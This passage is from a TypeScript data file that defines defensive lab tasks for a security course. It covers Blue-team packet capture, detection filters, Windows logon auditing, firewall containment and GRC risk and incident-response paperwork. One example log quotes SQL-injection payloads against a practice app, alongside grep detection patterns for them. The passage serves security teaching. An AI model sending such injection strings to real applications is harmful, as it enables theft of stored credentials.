            cmd: 'Get-MpComputerStatus | Out-File Defender_Status.txt',
            explain: 'Save Defender’s current status to a file as your evidence.',
            flags: [
              { flag: 'Get-MpComputerStatus', meaning: 'Report Defender’s real-time protection status.' },
              { flag: '| Out-File Defender_Status.txt', meaning: 'Send that report into a text file named Defender_Status.txt.' },
            ],
          },
        ],
        expectedOutput: 'Defender_Status.txt shows real-time protection on; SMB1 removed',
        outputExplanation: '`AMServiceEnabled : True` and `RealTimeProtectionEnabled : True` confirm Defender is active; SMBv1 should no longer be listed as enabled.',
        whatItMeans: 'Antivirus is current and a classic wormable protocol (SMBv1) is gone.',
        frameworks: ['CIS', 'NIST_CSF'],
        producesDeliverable: 'Defender_Status.txt',
        isEvidenceStep: true,
        optional: true,
        troubleshooting: 'If SMBv1 is already removed the command is a no-op — that is fine. A reboot may be needed to fully apply.',
      }
    ]
  },
  {
    id: 'blue-w2-baseline',
    role: 'blue',
    week: 2,
    title: 'Baseline Capture & Detection Engineering (Linux + Windows)',
    objective: 'Capture normal traffic, design detection rules, and turn on Windows event logging.',
    frameworks: ['NIST_CSF', 'NIST_800_115'],
    deliverables: ['Baseline_Traffic.pcap', 'Attack_Traffic.pcap', 'Wireshark_Filters.txt', 'Detection_Rules.txt', 'Win_EventLog.txt'],
    prerequisites: ["GRC's VM_SOP.md (what to monitor and how)", 'Week 1 hardening complete on both hosts'],
    definitionOfDone: ['A clean baseline.pcap is captured', 'Detection filters written', 'Windows security/PowerShell logging is enabled and exported'],
    handoff: [{ to: 'grc', artifact: 'Detection_Rules.txt', note: 'Report the detections now in place for the VM SOP.' }],
    learn: ['Packet capture & baselining with tcpdump/Wireshark', 'Writing detection filters', 'Enabling & reading Windows Event Logs (Sysmon/PowerShell)'],
    tools: ['tcpdump', 'Wireshark', 'Windows Event Viewer', 'PowerShell (Get-WinEvent)'],
    steps: [
      {
        id: 'blue-w2-s1',
        title: 'Capture Normal Traffic',
        description: 'Record baseline traffic while accessing application normally.',
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-2', explain: 'Create the week-2 artifacts folder.' },
          { cmd: 'sudo tcpdump -i ens18 -w ~/team-artifacts/week-2/Baseline_Traffic.pcap', explain: 'Capture traffic on ens18 to a pcap for your baseline (Ctrl-C to stop).' },
        ],
        commandExplanation: '`tcpdump` captures network packets; `-i ens18` selects the interface to sniff and `-w baseline.pcap` writes raw packets to a file (instead of printing them) for later analysis.',
        commandFlags: [
          { flag: 'tcpdump', meaning: 'Capture network packets.' },
          { flag: '-i ens18', meaning: 'Capture on the ens18 interface.' },
          { flag: '-w ~/team-artifacts/week-2/Baseline_Traffic.pcap', meaning: 'Write raw packets to the canonical baseline file.' },
        ],
        expectedOutput: 'PCAP file with normal HTTP requests',
        outputExplanation: 'It prints `listening on ens18...` and a rising packet count; stop with Ctrl-C — the resulting `baseline.pcap` holds your normal-traffic sample.',
        whatItMeans: 'Establishes pattern of legitimate traffic for comparison.',
        frameworks: ['NIST_800_115'],
        producesDeliverable: 'Baseline_Traffic.pcap',
        isEvidenceStep: true,
        fixes: [
          { symptom: 'Permission error?', fix: 'tcpdump needs sudo.' },
          { symptom: '"ens18: No such device"?', fix: 'List your interfaces with ip a and use the right name (ens33, enp0s3, etc.).' },
          { symptom: 'Empty capture?', fix: 'Generate traffic (ping/curl the target) while it runs, then Ctrl+C to stop.' },
        ],
      },
      {
        id: 'blue-w2-s2',
        title: 'Analyze Baseline in Wireshark',
        description: 'Study normal traffic patterns and timing.',
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-2', explain: 'Create the week-2 artifacts folder.' },
          { cmd: 'printf "http.request\\ntcp.flags.syn==1 && tcp.flags.ack==0\\n" > ~/team-artifacts/week-2/Wireshark_Filters.txt', explain: 'Save two display filters (HTTP requests; lone-SYN scan packets) to a file.' },
          { cmd: 'wireshark ~/team-artifacts/week-2/Baseline_Traffic.pcap &', explain: 'Open the capture in Wireshark in the background.' },
        ],
        commandExplanation: 'Opens the capture in the Wireshark GUI (the `&` frees your terminal); typing `http.request` in the display-filter bar shows only outbound HTTP requests.',
        commandFlags: [
          { flag: 'wireshark baseline.pcap', meaning: 'Open the capture in the GUI analyzer.' },
          { flag: '&', meaning: 'Run it in the background so the terminal is free.' },
          { flag: 'http.request', meaning: 'Display filter: show only HTTP requests.' },
        ],
        expectedOutput: 'Sequential requests, normal request rate, complete handshakes',
        outputExplanation: 'You should see steady, evenly-spaced requests and complete TCP handshakes (SYN, SYN-ACK, ACK) — this is what "normal" looks like for later comparison.',
        whatItMeans: 'Understand what normal looks like to detect anomalies.',
        frameworks: ['NIST_CSF'],
        producesDeliverable: 'Wireshark_Filters.txt',
        isEvidenceStep: true,
        fixes: [
          { symptom: '"wireshark: command not found"?', fix: 'sudo apt install wireshark.' },
          { symptom: 'Root warning on launch?', fix: 'Running as root warns you — fine in a lab.' },
          { symptom: 'No packets shown?', fix: 'Confirm you opened the right .pcap and cleared any display filter. The & returns your prompt immediately; that is expected.' },
        ],
      },
      {
        id: 'blue-w2-s3',
        title: 'Create Detection Filters',
        description: 'Write Wireshark filters for common attack patterns.',
        command: 'echo "Filter 1: tcp.flags.syn==1 && tcp.flags.ack==0 (SYN scan)" > ~/team-artifacts/week-2/Detection_Rules.txt',
        commandExplanation: '`echo ... > ~/team-artifacts/week-2/Detection_Rules.txt` saves a Wireshark display filter to the canonical file; `tcp.flags.syn==1 && tcp.flags.ack==0` matches lone SYN packets — the signature of a port scan.',
        commandFlags: [
          { flag: 'tcp.flags.syn==1', meaning: 'Match packets with the SYN flag set.' },
          { flag: 'tcp.flags.ack==0', meaning: '…and the ACK flag clear — a lone SYN means a scan.' },
          { flag: '> ~/team-artifacts/week-2/Detection_Rules.txt', meaning: 'Save the detection rule to the canonical file.' },
        ],
        expectedOutput: 'No screen output — the filter is written to Detection_Rules.txt',
        outputExplanation: 'Because of the `>` redirect the terminal prints nothing; run `cat ~/team-artifacts/week-2/Detection_Rules.txt` to confirm the rule is saved, ready to paste into Wireshark during an attack.',
        whatItMeans: 'Filters enable rapid identification of suspicious activity.',
        frameworks: ['NIST_CSF'],
        producesDeliverable: 'Detection_Rules.txt',
        isEvidenceStep: true,
        fixes: [
          { symptom: 'Nothing happened on screen?', fix: 'Correct — `>` sends the text to the file, not the screen.' },
          { symptom: 'cat shows nothing?', fix: 'The folder may be missing (run the mkdir step first), or you used a single `>` twice and overwrote it — use `>>` to append.' },
        ],
      },
      {
        id: 'blue-w2-s4',
        title: 'Windows: Enable & Export Security Logging',
        description: 'Turn on auditing of logon events and export recent security logs (PowerShell as Administrator on the Windows host).',
        commands: [
          {
            cmd: 'auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable',
            explain: 'Tell Windows to record both successful and failed logons. Run in an Administrator PowerShell.',
            flags: [
              { flag: 'auditpol /set', meaning: 'Change the audit (logging) policy.' },
              { flag: '/category:"Logon/Logoff"', meaning: 'The category to audit — login and logout events.' },
              { flag: '/success:enable /failure:enable', meaning: 'Log both successful logons and failed attempts.' },
            ],
          },
          {
            cmd: 'Get-WinEvent -LogName Security -MaxEvents 50 | Format-Table TimeCreated,Id,Message -Auto | Out-File Win_EventLog.txt',
            explain: 'Read the 50 most recent Security-log events and save them as your baseline evidence.',
            flags: [
              { flag: 'Get-WinEvent -LogName Security', meaning: 'Read entries from the Windows Security event log.' },
              { flag: '-MaxEvents 50', meaning: 'Take only the 50 newest events.' },
              { flag: '| Format-Table TimeCreated,Id,Message -Auto', meaning: 'Lay the events out as a readable table with those columns.' },
              { flag: '| Out-File Win_EventLog.txt', meaning: 'Save the table to a text file.' },
            ],
          },
        ],
        expectedOutput: `TimeCreated           Id  Message
-----------           --  -------
8/5/2026 9:58:12 AM  4624 An account was successfully logged on...
8/5/2026 9:57:41 AM  4625 An account failed to log on...
8/5/2026 9:57:39 AM  4625 An account failed to log on...
8/5/2026 9:55:03 AM  4672 Special privileges assigned to new logon...`,
        outputHighlights: [
          { text: '4624', label: 'a successful logon. Knowing this ID now is what lets you separate "someone got in" from "someone tried" when you read these logs under pressure next week.' },
          { text: '4625', label: 'a failed logon. A burst of these from one source is the Windows signature of the brute force Red runs in Week 3 — this is the event you are enabling logging to catch.' },
          { text: 'TimeCreated', label: 'events must have real timestamps. If this table is empty, auditing was not actually on when the logons happened — the first line enabling it has to run before, not after.' },
        ],
        whatItMeans: 'Windows now records who logs in (and who fails), the basis for detection.',
        frameworks: ['NIST_CSF', 'NIST_800_115'],
        producesDeliverable: 'Win_EventLog.txt',
        isEvidenceStep: true,
        optional: true,
        troubleshooting: 'No events? Generate one by logging off/on, then re-run the Get-WinEvent line.',
      },
      {
        id: 'blue-w2-s5',
        title: 'Capture a Labeled Attack Sample',
        description: 'Record a short capture while generating scan/login noise, to keep alongside the baseline.',
        instruction: 'Start a capture, run a quick nmap/login against your own host, then let it stop.',
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-2', explain: 'Create the week-2 artifacts folder.' },
          { cmd: 'sudo tcpdump -i ens18 -c 200 -w ~/team-artifacts/week-2/Attack_Traffic.pcap', explain: 'Capture 200 packets of attack traffic to a pcap, then stop.' },
        ],
        commandExplanation: '`tcpdump -c 200` captures 200 packets to Attack_Traffic.pcap so you have an abnormal sample to compare against the baseline.',
        commandFlags: [
          { flag: '-c 200', meaning: 'Capture 200 packets then stop automatically.' },
          { flag: '-w ~/team-artifacts/week-2/Attack_Traffic.pcap', meaning: 'Write the sample to the canonical file.' },
        ],
        expectedOutput: 'Attack_Traffic.pcap created',
        outputExplanation: 'A `.pcap` of ~200 packets appears; opened in Wireshark it should show the scan/login noise your filters target.',
        whatItMeans: 'Gives you an abnormal-traffic reference so detection filters can be validated before the real attack.',
        frameworks: ['NIST_800_115'],
        producesDeliverable: 'Attack_Traffic.pcap',
        isEvidenceStep: true,
        troubleshooting: 'Capture stops instantly with 0 packets? Nothing was flowing — start your nmap/login against the host right after you press Enter. Wrong interface? Use the name from ip a (ens33/enp0s3). Needs sudo.',
      }
    ]
  },
  {
    id: 'blue-w3-detection',
    role: 'blue',
    week: 3,
    title: 'Live Detection & Response (Linux + Windows)',
    objective: 'Detect attacks as they happen on both hosts and respond with containment per the IR runbook.',
    frameworks: ['NIST_CSF', 'NIST_800_61'],
    deliverables: ['Attack_Pcap.pcap', 'Attack_Logs.txt', 'Containment_Actions.txt', 'Win_Detection.txt'],
    prerequisites: ["GRC's IR_Runbook.md (follow it during the breach)", 'Capture/logging from Week 2 running on both hosts'],
    definitionOfDone: ['Attack traffic captured', 'SQL-injection attempt detected in Linux logs', 'Windows failed-logon spike detected', 'Attacker contained on both hosts'],
    handoff: [{ to: 'grc', artifact: 'Incident_Response.txt', note: 'Submit IR notes and logs for chain of custody.' }],
    learn: ['Live triage from packets and logs', 'Detecting brute force on Windows (Event ID 4625)', 'Containment on Linux (UFW) and Windows (firewall rule)'],
    tools: ['tcpdump', 'tail/grep', 'PowerShell (Get-WinEvent)', 'Windows Firewall'],
    steps: [
      {
        id: 'blue-w3-s1',
        title: 'Start Live Packet Capture',
        description: 'Begin recording before Red starts attacks.',
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Create the week-3 artifacts folder.' },
          { cmd: 'sudo tcpdump -i ens18 -w ~/team-artifacts/week-3/Attack_Pcap.pcap', explain: 'Start capturing attack traffic to a pcap before Red begins.' },
        ],
        commandExplanation: 'Same packet capture as the baseline, started *before* the Red team attacks so every malicious packet is recorded to `attack_capture.pcap`.',
        commandFlags: [
          { flag: 'tcpdump', meaning: 'Capture network packets.' },
          { flag: '-i ens18', meaning: 'Capture on the ens18 interface.' },
          { flag: '-w ~/team-artifacts/week-3/Attack_Pcap.pcap', meaning: 'Write packets to the canonical attack-capture file.' },
        ],
        expectedOutput: 'Capture running, file growing',
        outputExplanation: '`listening on ens18` plus a climbing packet count means it is recording; verify the `.pcap` file size grows as traffic arrives.',
        whatItMeans: 'Forensic evidence collection; chain of custody begins.',
        frameworks: ['NIST_800_61'],
        producesDeliverable: 'Attack_Pcap.pcap',
        isEvidenceStep: true,
        fixes: [
          { symptom: 'Missed the evidence?', fix: 'Start this BEFORE Red attacks, or you miss it. Leave it running in its own terminal; the file grows as packets arrive — do not Ctrl+C until the attack window is over.' },
          { symptom: 'Needs sudo / wrong interface?', fix: 'Run it with sudo, and use the interface name from ip a.' },
        ],
      },
      {
        id: 'blue-w3-s2',
        title: 'Monitor Logs in Real Time',
        description: 'Watch system and web server logs.',
        commands: [
          { cmd: 'mkdir -p ~/team-artifacts/week-3', explain: 'Create the week-3 artifacts folder.' },
          { cmd: 'tail -n 200 /var/log/apache2/access.log | tee ~/team-artifacts/week-3/Attack_Logs.txt', explain: 'Save the last 200 web-server log lines as evidence.' },
        ],
        commandExplanation: '`tail -f` prints the end of the Apache access log and then *follows* it, streaming each new request live as it is written.',
        commandFlags: [
          { flag: 'tail', meaning: 'Show the end of a file.' },
          { flag: '-f', meaning: 'Follow — stream new lines as they are written.' },
          { flag: '/var/log/apache2/access.log', meaning: 'The Apache request log to watch.' },
        ],
        expectedOutput: 'HTTP requests, errors, failed auth attempts',
        outputExplanation: 'Each line is one HTTP request (IP, time, method, URL, status). A burst of requests or repeated 401/404s flags attacker activity in real time.',
        whatItMeans: 'Real-time visibility into attacker activity.',
        frameworks: ['NIST_CSF'],
        producesDeliverable: 'Attack_Logs.txt',
        isEvidenceStep: true,
        fixes: [
          { symptom: '"No such file or directory"?', fix: 'DVWA in Docker logs elsewhere — try /var/log/apache2/access.log inside the container (sudo docker logs dvwa) or the host path you mapped.' },
          { symptom: 'Permission denied?', fix: 'Use sudo.' },
          { symptom: 'Nothing new appearing?', fix: 'Generate a request (browse the site) to produce a log line.' },
        ],
      },
      {
        id: 'blue-w3-s3',
        title: 'Detect SQL Injection Pattern',
        description: 'Identify SQL injection attempt in logs.',
        command: 'grep -i "union\\|select" /var/log/apache2/access.log',
        commandExplanation: '`grep -i` searches the log case-insensitively; the pattern `union\\|select` matches either SQL keyword, surfacing requests that look like SQL injection.',
        commandFlags: [
          { flag: 'grep', meaning: 'Search text for a pattern.' },
          { flag: '-i', meaning: 'Case-insensitive match.' },
          { flag: 'union\\|select', meaning: 'Match either SQL keyword (\\| means OR).' },
        ],
        expectedOutput: `10.10.100.5 - - [05/Aug/2026:11:03:02 +0000] "GET /vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- &Submit=Submit HTTP/1.1" 200 4821
10.10.100.5 - - [05/Aug/2026:11:03:05 +0000] "GET /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit HTTP/1.1" 200 1136`,
        outputHighlights: [
          { text: 'UNION SELECT user,password FROM users', label: 'the injection itself, sitting in a URL. No legitimate visitor ever sends SQL — a single match here confirms the attack attempt.' },
          { text: '10.10.100.5', label: 'the attacker’s IP, the same on both lines. This is what you feed into containment and into the incident report.' },
          { text: '200', label: 'the server answered the injected request instead of rejecting it. A 200 on a line like this is the difference between "attempted" and "the app processed it".' },
        ],
        whatItMeans: 'Confirms SQL injection attack attempt. Write up the incident in the Incident Report form.',
        frameworks: ['OWASP', 'NIST_800_61'],
        usesForm: 'Incident Report',
        isEvidenceStep: true,
        troubleshooting: 'No matches? The attack may not have run yet, the keywords may be URL-encoded (try grep -iE "union|select|%27|0x"), or the log path differs (see the previous step). Case matters — keep -i. Escape the pipe as \\| inside quotes.',
      },
      {
        id: 'blue-w3-s4',
        title: 'Block Attacker IP',
        description: 'Use firewall to deny further traffic from attacker.',
        commands: [
          { cmd: 'sudo ufw deny from 10.10.100.X', explain: 'Block all traffic from the attacker IP at the firewall.' },
          { cmd: 'echo "$(date +%F\\ %T) Blocked 10.10.100.X via UFW after SQLi/brute force" >> ~/team-artifacts/week-3/Containment_Actions.txt', explain: 'Append a timestamped containment note to your action log.' },
        ],
        commandExplanation: '`ufw deny from <ip>` inserts a firewall rule that drops all traffic from the attacker address — an immediate containment action.',
        commandFlags: [
          { flag: 'ufw deny from', meaning: 'Add a rule that drops all traffic from an address.' },
          { flag: '10.10.100.X', meaning: 'The attacker IP to block.' },
        ],
        expectedOutput: 'UFW rule added',
        outputExplanation: '`Rule added` confirms it; `ufw status` now lists a DENY entry for that IP and the attacker requests stop appearing in the logs.',
        whatItMeans: 'Containment action stops ongoing attacks.',
        frameworks: ['NIST_800_61'],
        producesDeliverable: 'Containment_Actions.txt',
        isEvidenceStep: true,
        fixes: [
          { symptom: 'Rule does nothing?', fix: 'Use the REAL attacker IP you found in the logs, not the literal 10.10.100.X.' },
          { symptom: '"ERROR: Bad source address"?', fix: 'Check the IP format.' },
          { symptom: 'Rule not taking effect?', fix: 'Confirm UFW is enabled (sudo ufw status). To undo later: sudo ufw delete deny from <ip>.' },
        ],
      },
      {
        id: 'blue-w3-s5',
        title: 'Windows: Detect Brute Force & Contain',
        description: 'Spot the failed-logon spike on Windows and block the source (PowerShell as Administrator).',
        commands: [
          {
            cmd: 'Get-WinEvent -FilterHashtable @{LogName="Security";Id=4625} -MaxEvents 20 | Out-File Win_Detection.txt',
            explain: 'Pull the recent failed-logon events (Event ID 4625) — a burst of these is the signature of a brute-force attack — and save them as evidence.',
            flags: [
              { flag: 'Get-WinEvent', meaning: 'Read the Windows event log.' },
              { flag: '-FilterHashtable @{LogName="Security";Id=4625}', meaning: 'Filter to Security-log events with ID 4625 (failed logon).' },
              { flag: '-MaxEvents 20', meaning: 'Take the 20 most recent matching events.' },
              { flag: '| Out-File Win_Detection.txt', meaning: 'Save them to a file named Win_Detection.txt.' },
            ],
          },
          {
            cmd: 'New-NetFirewallRule -DisplayName "Block Attacker" -Direction Inbound -RemoteAddress <ATTACKER_IP> -Action Block',
            explain: 'Create a firewall rule that drops all incoming traffic from the attacker’s IP. Replace <ATTACKER_IP> with the address you found (or set it in the Lab access panel to auto-fill).',
            flags: [
              { flag: 'New-NetFirewallRule', meaning: 'Create a new Windows Firewall rule.' },
              { flag: '-DisplayName "Block Attacker"', meaning: 'A readable name so you can find/remove the rule later.' },
              { flag: '-Direction Inbound', meaning: 'Apply to traffic coming IN to this host.' },
              { flag: '-RemoteAddress <ATTACKER_IP>', meaning: 'The source IP to match — the attacker.' },
              { flag: '-Action Block', meaning: 'Drop matching traffic (Block; alternatives: Allow).' },
            ],
          },
        ],
        expectedOutput: `TimeCreated           Id  Message
-----------           --  -------
8/5/2026 11:04:57 AM 4625 An account failed to log on... Account Name: admin
8/5/2026 11:04:56 AM 4625 An account failed to log on... Account Name: admin
8/5/2026 11:04:56 AM 4625 An account failed to log on... Account Name: admin
8/5/2026 11:04:55 AM 4625 An account failed to log on... Account Name: admin`,
        outputHighlights: [
          { text: '4625', label: 'the failed-logon event. One is normal; a wall of them like this is the brute force. The pattern, not any single line, is the detection.' },
          { text: 'Account Name: admin', label: 'the same account hammered repeatedly — a guessing attack, not a user fat-fingering their password. This is what justifies blocking the source.' },
          { text: '11:04:5', label: 'four failures inside three seconds. That rate is impossible by hand and is the clearest tell that this is automated.' },
        ],
        whatItMeans: 'You detected and contained the attack on the Windows host, mirroring the Linux response.',
        frameworks: ['NIST_CSF', 'NIST_800_61'],
        producesDeliverable: 'Win_Detection.txt',
        isEvidenceStep: true,
        optional: true,
        troubleshooting: 'No 4625 events? Confirm logon auditing was enabled in Week 2 (blue-w2-s4) and that Red has started the brute force.',
      }
    ]
  },
  {
    id: 'blue-w4-response',
    role: 'blue',
    week: 4,
    title: 'Incident Response Findings',
    objective: 'Present detection engineering and response actions.',
    frameworks: ['NIST_800_61', 'NIST_CSF'],
    deliverables: [],
    prerequisites: ['Week 3 detection & response notes', 'IR runbook outcomes'],
    definitionOfDone: ['Detection summary written', 'Response timeline built', 'Your briefing slides drafted'],
    handoff: [{ to: 'grc', artifact: 'Detection_Summary.md', note: 'Feed detection/response results into the final report.' }],
    learn: ['Summarizing detection engineering', 'Building an incident timeline'],
    tools: ['Markdown', 'Slides'],
    steps: [
      {
        id: 'blue-w4-s1',
        title: 'Compile Detection Evidence',
        description: 'Document what you detected and when.',
        instruction: 'Record your detections and their timing in the Incident Report form.',
        whatItMeans: 'Shows detection capability and speed of response.',
        frameworks: ['NIST_800_61'],
        usesForm: 'Incident Report',
      },
      {
        id: 'blue-w4-s2',
        title: 'Build the Response Timeline',
        description: 'Build the response timeline.',
        instruction: 'Lay out your detect, contain and recover timeline in the Incident Report form.',
        whatItMeans: 'Demonstrates how fast you moved from detection to containment.',
        frameworks: ['NIST_800_61'],
        usesForm: 'Incident Report',
      },
      {
        id: 'blue-w4-s3',
        title: 'Draft Your Briefing Slides',
        description: 'Prepare your briefing slides.',
        instruction: 'Build a few briefing slides from your Incident Report — what you saw and how you responded.',
        whatItMeans: 'Your half of the final briefing is ready to combine into the team deck.',
        frameworks: ['NIST_CSF'],
      }
    ]
  }
];

// GRC (Fixers) Tasks
const GRC_TASKS: Task[] = [
  {
    id: 'grc-w0-setup',
    role: 'grc',
    week: 0,
    title: 'Open the Policy Workspace & Authorize the Engagement',
    objective: 'Set up where your company stores artifacts and put the authorized scope in writing for Red and Blue.',
    frameworks: ['ISO_27001', 'NIST_CSF'],
    deliverables: ['01_Scope_and_RoE.md'],
    learn: ['Organizing a shared evidence workspace', 'What an authorization memo / Rules of Engagement is', 'Coordinating Red and Blue as the responsible role'],
    tools: ['Markdown editor', 'mkdir / shared folder'],
    prerequisites: ['Authorization + target list (from the instructor)'],
    definitionOfDone: ['A team-artifacts folder structure exists', 'Authorized scope is written down', 'Red and Blue both received the scope'],
    handoff: [
      { to: 'red', artifact: 'Rules_of_Engagement.md', note: 'Send the authorized scope before any scanning.' },
      { to: 'blue', note: 'Tell Blue which two systems (Ubuntu + Windows) to harden.' },
    ],
    steps: [
      {
        id: 'grc-w0-s1',
        title: 'Create the Shared Workspace',
        description: 'Create the canonical per-week folders where every team artifact lives.',
        instruction: 'Create the five week folders under your home directory.',
        command: 'mkdir -p ~/team-artifacts/{week-0,week-1,week-2,week-3,week-4}',
        commandExplanation: '`mkdir -p` creates `~/team-artifacts/` plus the five week subfolders in one pass via brace expansion.',
        expectedOutput: 'Folders created (no output on success)',
        outputExplanation: 'Run `ls ~/team-artifacts/` to confirm week-0…week-4 exist.',
        whatItMeans: 'Gives every teammate one predictable drop-off path (`~/team-artifacts/week-N/`) so files never get lost or duplicated.',
        frameworks: ['ISO_27001'],
        troubleshooting: 'Permission denied? Confirm you are writing under `~/` (your home), not a system path.',
      },
      {
        id: 'grc-w0-s2',
        title: 'Draft the Rules of Engagement',
        description: 'Put the authorized scope in writing.',
        instruction: 'Write the authorized scope in the Scope and Rules of Engagement form (it exports as 01_Scope_and_RoE.md — that file IS your Rules of Engagement), then share it with Red and Blue.',
        whatItMeans: 'Sets the legal boundary Red may attack and Blue must defend.',
        frameworks: ['ISO_27001', 'NIST_CSF'],
        usesForm: 'Scope & Rules of Engagement',
      },
    ],
  },
  {
    id: 'grc-w1-framework',
    role: 'grc',
    week: 1,
    title: 'Framework Mapping & Hardening Standard',
    objective: 'Log Week 1 artifacts into the chain-of-custody register, map them to NIST CSF + CIS, and issue a Hardening Standard to Blue.',
    frameworks: ['NIST_CSF', 'CIS', 'STRIDE'],
    deliverables: ['02_Asset_Inventory.csv', '09_Framework_Mapping.md', '10_Lab_Security_Policy.md', '11_Hardening_Standard.md'],
    prerequisites: ["Red's Asset_List.md and Recon_Findings.md", "Blue's Hardening_Checklist.txt and UFW_Status.txt", 'Your Rules_of_Engagement.md from Week 0'],
    definitionOfDone: ['All four Week 1 files logged + hashed in Artifact_Register.md', 'Findings mapped to NIST CSF + CIS in Framework_Mapping.md', 'Lab_Security_Policy_v1.0.md drafted', 'Hardening_Standard.md handed to Blue'],
    handoff: [
      { to: 'blue', artifact: 'Hardening_Standard.md', note: 'The OS-specific controls Blue must implement on both hosts.' },
      { to: 'red', artifact: 'Rules_of_Engagement.md', note: 'Reconfirm Week 2 scanning stays within authorized scope.' },
    ],
    learn: ['Turning controls into policy with NIST CSF & CIS', 'Writing an actionable Hardening Standard (SOP)', 'How GRC drives Blue/Red instead of just reporting'],
    tools: ['NIST CSF', 'CIS Controls', 'Markdown'],
    steps: [
      {
        id: 'grc-w1-s1',
        title: 'Gather & log Week 1 artifacts',
        description: 'Gather the Week 1 work from your teammates.',
        instruction: 'Confirm Red and Blue dropped their Week 1 files, then enter the discovered assets into the Asset Inventory form.',
        whatItMeans: 'Brings the team Week 1 work together and starts the asset inventory.',
        frameworks: ['NIST_CSF', 'ISO_27001'],
        usesForm: 'Asset Inventory',
      },
      {
        id: 'grc-w1-s2',
        title: 'Map findings to NIST CSF',
        description: 'Map findings to NIST CSF controls.',
        instruction: 'Add each finding to the Framework Mapping form and tag its NIST CSF function + control — you will cite these in the Risk Register and Final Report.',
        whatItMeans: 'Turns raw findings into a control-by-control audit trail.',
        frameworks: ['NIST_CSF'],
        usesForm: 'Framework Mapping',
      },
      {
        id: 'grc-w1-s3',
        title: 'Append CIS Control rows',
        description: 'Map findings to CIS Controls.',
        instruction: 'In the same Framework Mapping form, fill the CIS control for each row so coverage gaps are obvious.',
        whatItMeans: 'Cross-references the same evidence against a second framework.',
        frameworks: ['CIS'],
        usesForm: 'Framework Mapping',
      },
      {
        id: 'grc-w1-s4',
        title: 'Draft Security Policy v1.0',
        description: 'Set the baseline policy.',
        instruction: 'Capture your baseline rules (no root SSH, firewall on, logging) in the Lab Security Policy form — they anchor the Scope and Final Report.',
        whatItMeans: 'Converts the framework mapping into enforceable rules every host must meet.',
        frameworks: ['ISO_27001'],
        usesForm: 'Lab Security Policy',
      },
      {
        id: 'grc-w1-s5',
        title: 'Write the Hardening Standard for Blue',
        description: 'Tell Blue which controls to apply.',
        instruction: 'List the exact controls Blue must apply in the Hardening Standard form; Blue then implements them and records the result in the Hardening Baseline form.',
        whatItMeans: 'GRC sets the standard; Blue implements it.',
        frameworks: ['CIS', 'NIST_CSF'],
        usesForm: 'Hardening Standard',
      }
    ]
  },
  {
    id: 'grc-w2-risk',
    role: 'grc',
    week: 2,
    title: 'Risk Assessment & Vulnerability-Management SOP',
    objective: 'Score the risks and write the Vulnerability-Management SOP your Blue team follows to remediate.',
    frameworks: ['NIST_CSF', 'CVSS'],
    deliverables: ['03_Risk_Register.csv', '12_VM_SOP.md'],
    prerequisites: ["Red's Vulnerability_Summary.md (the findings)", 'Your Week 1 Hardening Standard'],
    definitionOfDone: ['Risk matrix built', 'CVSS scores assigned', 'VM SOP written and handed to Blue with remediation priorities'],
    handoff: [{ to: 'blue', artifact: 'VM_SOP.md', note: 'Remediation order and process Blue follows.' }],
    learn: ['Likelihood × Impact risk scoring', 'CVSS severity', 'Writing a Vulnerability-Management SOP from a framework'],
    tools: ['CVSS', 'NIST CSF', 'Markdown'],
    steps: [
      {
        id: 'grc-w2-s1',
        title: 'Collect Vulnerability Data',
        description: 'Gather the Week 2 findings.',
        instruction: 'Confirm Red dropped the Week 2 scan findings, then open the Risk Register form.',
        whatItMeans: 'Brings the scan findings in before they drive risk decisions.',
        frameworks: ['NIST_CSF', 'ISO_27001'],
        usesForm: 'Risk Register',
      },
      {
        id: 'grc-w2-s2',
        title: 'Create Risk Matrix',
        description: 'Score each risk.',
        instruction: 'Score each risk (likelihood by impact) in the Risk Register form — the rating is computed for you.',
        whatItMeans: 'Prioritizes risks for remediation.',
        frameworks: ['NIST_CSF'],
        usesForm: 'Risk Register',
      },
      {
        id: 'grc-w2-s3',
        title: 'Assign CVSS Scores',
        description: 'Add CVSS severities.',
        instruction: 'Add a CVSS severity to each finding in the Risk Register form.',
        whatItMeans: 'Standardized severity helps prioritization.',
        frameworks: ['CVSS'],
        usesForm: 'Risk Register',
      },
      {
        id: 'grc-w2-s4',
        title: 'Write the Vulnerability-Management SOP for Blue',
        description: 'Hand Blue the remediation order.',
        instruction: 'Fill the Vulnerability-Management SOP form — the priority rule (highest risk first) and the ordered steps Blue follows to fix and verify.',
        whatItMeans: 'GRC defines the remediation process; Blue carries it out.',
        frameworks: ['NIST_CSF', 'CVSS'],
        usesForm: 'Vulnerability-Management SOP',
      }
    ]
  },
  {
    id: 'grc-w3-custody',
    role: 'grc',
    week: 3,
    title: 'Incident-Response Runbook & Chain of Custody',
    objective: 'Issue the IR runbook your Blue team follows during the breach, then preserve the evidence with chain of custody.',
    frameworks: ['NIST_800_61', 'ISO_27001'],
    deliverables: ['13_IR_Runbook.md', '14_Evidence_Log.csv', 'Evidence_Hashes.txt'],
    prerequisites: ['Week 2 VM SOP issued', "Blue's detections from Week 2 in place"],
    definitionOfDone: ['IR runbook handed to Blue before the attack', 'All evidence hashed and logged', 'Chain of custody intact'],
    handoff: [{ to: 'blue', artifact: 'IR_Runbook.md', note: 'The steps Blue follows the moment an attack is detected.' }],
    learn: ['Writing an incident-response runbook (NIST 800-61)', 'Evidence hashing & chain of custody', 'Coordinating the company during an incident'],
    tools: ['NIST 800-61', 'sha256sum', 'Markdown'],
    steps: [
      {
        id: 'grc-w3-s5',
        title: 'Write the IR Runbook for Blue (do this first)',
        description: 'Give Blue the incident-response steps.',
        instruction: 'Fill the Incident-Response Runbook form — the detect → contain → eradicate → recover → report steps Blue follows during the attack. Hand it over before Red begins.',
        whatItMeans: 'GRC prepares the response plan; Blue executes it during the attack.',
        frameworks: ['NIST_800_61'],
        usesForm: 'Incident-Response Runbook',
      },
      {
        id: 'grc-w3-s1',
        title: 'Receive Artifacts from Team',
        description: 'Receive the attack evidence from the team.',
        instruction: 'Confirm Red and Blue dropped their Week 3 evidence, then open the Incident Report form to log it.',
        whatItMeans: 'Brings every attack artifact under chain of custody as it arrives.',
        frameworks: ['NIST_800_61'],
        usesForm: 'Incident Report',
      },
      {
        id: 'grc-w3-s2',
